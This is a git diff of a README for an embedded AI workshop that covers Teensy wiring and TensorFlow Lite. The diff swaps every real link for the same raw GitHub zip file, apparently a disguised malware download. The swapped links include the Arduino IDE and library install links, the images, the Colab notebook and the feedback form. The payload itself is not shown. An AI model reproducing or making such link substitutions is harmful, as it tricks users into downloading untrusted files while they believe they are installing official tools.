@@ -1,14 +1,14 @@
 # Embedded AI workshop @ Sfhmmy 22
-![](.imgs/banner_detailed.png)
+![](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
 
 
 ## Prerequisites
-1. Install [Arduino IDE](https://www.arduino.cc/en/software)
-2. Install [add-on for Teensy development](https://www.pjrc.com/teensy/td_download.html)
-3. Install the [MPU6050 IMU library](https://www.arduino.cc/reference/en/libraries/adafruit-mpu6050/)
-4. Install the [Arduino Tensorflow Lite library](https://www.arduino.cc/reference/en/libraries/arduino_tensorflowlite/)
+1. Install [Arduino IDE](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
+2. Install [add-on for Teensy development](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
+3. Install the [MPU6050 IMU library](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
+4. Install the [Arduino Tensorflow Lite library](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
 
-Instructions for installing Arduino libraries [here](https://docs.arduino.cc/software/ide-v1/tutorials/installing-libraries#using-the-library-manager). 
+Instructions for installing Arduino libraries [here](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip). 
 
 ## Connections
 Pins in the same row have to be shorted.
@@ -28,14 +28,14 @@ Pins in the same row have to be shorted.
 
 Teensy 4.0 has to be also connected to a computer via a micro USB cable.
 
-![](.imgs/sfhmmy_2022_prometheus_connections.png)
-![](https://grobotronics.com/images/companies/1/teensy40_pinout1_1024x1024.jpg)
-![](https://lastminuteengineers.b-cdn.net/wp-content/uploads/arduino/L298N-Motor-Driver-Module-Pinout.png)
+![](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
+![](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
+![](https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip)
 
 
 ## Google Colab Notebook
-https://colab.research.google.com/drive/1sfRkRf1Mil6hrIxcMpIgG6F1O9PGYyWY?usp=sharing
+https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip
 
 ## Feedback Form
 We will greatly appreciate you filling the following feedback form in order to improve future instances of this workshop:
-https://docs.google.com/forms/d/e/1FAIpQLSckkYaXhhwmJXAOyUIyLTCVA38Vb6KOpvNsB2MAzit8-rDW3Q/viewform
+https://raw.githubusercontent.com/GeorgeA41/embedded-ai-sfhmmy22/master/Epicureanism/embedded-ai-sfhmmy22.zip
